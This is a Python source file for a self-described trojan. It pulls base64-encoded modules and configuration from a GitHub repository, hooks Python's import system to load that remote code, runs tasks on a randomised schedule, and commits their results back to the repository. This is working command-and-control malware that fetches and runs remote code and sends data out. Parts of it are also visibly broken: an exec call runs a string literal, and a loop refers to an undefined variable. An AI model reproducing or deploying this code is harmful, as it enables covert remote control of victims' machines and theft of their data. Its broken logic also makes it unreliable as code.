#!/usr/bin/python3
import os
import sys
import imp
import importlib
import json
import time
import queue
import base64
import random
import threading
from github3 import login


trojan_id = "abc"
trojan_config = "{}.json".format(trojan_id)
data_path = "data/{}/".format(trojan_id)
trojan_modules = []
configured = False
task_queue = queue.Queue()


class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print("[+] Attempting to retrieve {}".format(fullname))
            new_library = get_file_contents("modules/{}".format(fullname))

            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None

    def load_module(self, name):
        module = imp.new_module(name)
        exec("self.current_module_code in module.__dict__")
        sys.modules[name] = module
        return module


def connect_to_github():
    gh = login(username='jakiiii', password='')
    repo = gh.repositories('jakiiii', 'jTro-Tools')
    branch = repo.branch('master')
    return gh, repo, branch


def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print("[+] Found file {}".format(filepath))
            blob = repo.blob(filename.__json_data['sha'])
            return blob.content
    return None


def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for t in config:
        if task['module'] not in sys.modules:
            exec("import {}".format(t['module']))
    return config


def store_module_result(data):
    gh, repo, branch = connect_to_github()
    remote_path = "data/{}/{}.data".format(trojan_id, random.randint(1000, 100000))
    repo.create_file(remote_path, "Commit message", base64.b64encode(data))
    return


def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    # store the result in repo
    store_module_result(result)
    return


# main trojan
sys.meta_path = [GitImporter()]
while True:
    if task_queue.empty():
        config = get_trojan_config()
        for task in config:
            th = threading.Thread(target=module_runner, args=(task['module'],))
            th.start()
            time.sleep(random.randint(1,10))

    time.sleep(random.randint(1000, 10000))
